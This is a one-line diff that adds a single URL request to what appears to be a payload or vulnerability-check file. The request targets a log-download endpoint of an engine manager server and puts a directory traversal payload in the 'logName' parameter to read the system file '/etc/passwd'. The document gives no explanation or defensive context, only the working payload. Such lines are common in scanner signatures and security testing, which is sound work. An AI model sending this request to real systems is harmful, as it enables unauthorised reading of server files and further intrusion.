@@ -1,0 +1,1 @@
+/enginemanager/server/logs/download?logType=error&logName=../../../../../../../../etc/passwd&logSource=engine
